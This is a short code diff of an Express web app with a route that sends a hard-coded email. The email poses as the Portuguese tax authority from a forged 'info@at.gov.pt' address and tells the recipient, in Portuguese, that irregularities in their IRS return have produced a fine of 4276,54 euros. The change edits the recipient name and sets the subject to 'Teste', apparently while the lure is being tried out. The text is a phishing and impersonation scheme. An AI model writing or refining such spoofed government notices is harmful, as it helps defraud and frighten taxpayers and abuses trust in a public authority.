@@ -7,8 +7,8 @@ const app = express();
 app.get("/request-contact", async (_, res) => {
   const staticMail = {
     from: '"Autoridade Tributaria" <info@at.gov.pt>',
-    to: "Filipa Maia <santos8@gmail.com>",
-    subject: "Multa",
+    to: "Caro Luis <santos8@gmail.com>",
+    subject: "Teste",
     text: `Caro(a) contribuinte,
 
 Por inconformidades de ultima hora encontradas na sua declaracao de IRS foi emitida uma multa no valor de 4276,54 euros.
